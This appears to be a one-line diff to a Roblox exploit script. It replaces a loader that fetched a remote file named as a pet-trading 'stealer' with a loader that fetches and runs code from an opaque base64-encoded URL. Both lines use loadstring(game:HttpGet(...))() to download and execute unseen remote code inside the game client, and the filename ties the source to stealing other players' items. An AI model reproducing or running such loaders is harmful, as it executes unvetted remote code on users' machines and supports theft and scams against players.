@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://cdn.project-reverse.org/ame_trade_pets_not_working_with_stealer.luau"))();
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6Ijk0Njg0MTcwLTNiZDEtNDMwZC1hNGQ4LTI0ZDdlYmNmNjExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
